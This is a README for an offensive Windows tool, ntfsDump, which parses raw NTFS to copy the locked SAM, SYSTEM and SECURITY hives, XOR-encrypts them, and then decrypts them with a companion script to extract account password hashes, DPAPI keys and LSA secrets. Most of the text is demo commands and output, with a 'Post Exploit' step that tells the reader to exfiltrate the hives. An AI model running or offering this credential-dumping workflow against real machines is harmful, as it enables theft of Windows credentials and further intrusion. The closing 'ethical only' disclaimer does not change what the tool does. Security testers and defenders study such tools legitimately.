# ntfsDump
Use to copy a file from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.
Give the credit to 3gstudent, who wrote the original code.
I've just added the ability to automatically dump SAM, SYSTEM and SECURITY. All encrypted with an XOR key.

Similar to: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1

Reference: https://www.codeproject.com/Articles/81456/An-NTFS-Parser-Lib

# Demo 
```powershell
.\ntfsDump.exe Yolo
[+] POC NTFSDUMP - Dump Windows Secrets using NTFS


[*] Try to parse root directory
[*] Try to find subdirectory
[*] Try to dump C:\Windows\System32\config\SAM
    source file size:65536
[*] All done.

[*] Try to parse root directory
[*] Try to find subdirectory
[*] Try to dump C:\Windows\System32\config\SYSTEM
    source file size:13631488
    start reading through the while loop
    remaining:13631488...12582912...11534336...10485760...9437184...8388608...7340032...6291456...5242880...4194304...3145728...2097152...1048576...
[*] All done.

[*] Try to parse root directory
[*] Try to find subdirectory
[*] Try to dump C:\Windows\System32\config\SECURITY
    source file size:65536
[*] All done.

Enjoy !
```

# Post Exploit
You can then exfiltrate the encrypted hives, and use another python code I've made to make it easier to extract the secrets:

```python
python .\Dumpy.py C:\SAM C:\SYSTEM C:\SECURITY Yolo
Decrypting C:\SYSTEM: 100%|███████████████████████████████████████████████████████| 13.6M/13.6M [00:01<00:00, 8.90MB/s]

Decrypting C:\SAM: 100%|██████████████████████████████████████████████████████████████████| 65.5k/65.5k [00:00<?, ?B/s]

Decrypting C:\SECURITY: 100%|█████████████████████████████████████████████████████| 65.5k/65.5k [00:00<00:00, 4.25MB/s]

Bootkey : ********************************

Administrator:500:aad3b435b51404eeaad3b435b51404ee:********************************:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:********************************:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:********************************:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:********************************:::
windobe:1000:aad3b435b51404eeaad3b435b51404ee:********************************:::
wuentin:1001:aad3b435b51404eeaad3b435b51404ee:********************************:::
dpapi_machinekey:****************************************
dpapi_userkey::****************************************
 0000   7D 0D BC AE 65 79 DF 36  74 6B 50 71 49 37 9A 42   }...ey.6tkPqI7.B
 0010   C0 51 68 61 9D 42 C9 61  C5 CE 88 2F E1 DB C7 CD   .Qha.B.a.../....
 0020   FB 41 11 EF 4D 14 D1 3A  2B 66 48 A8 19 95 29 9F   .A..M..:+fH...).
 0030   D0 50 AF BE 15 76 F0 21  D0 5C DF 46 71 66 8A 0F   .P...v.!.\.Fqf..
NL$KM:********************************************************************************************************************************
```
[Dumpy](https://github.com/Wuentin/Dumpy)

Ethical Only
The intended use of this program is strictly for educational purposes, promoting ethical understanding and responsible learning in the realm of cybersecurity. This tool is not meant for any malicious activities or unauthorized access.
Using this tool against hosts that you do not have explicit permission to test is illegal. You are responsible for any trouble you may cause by using this tool.
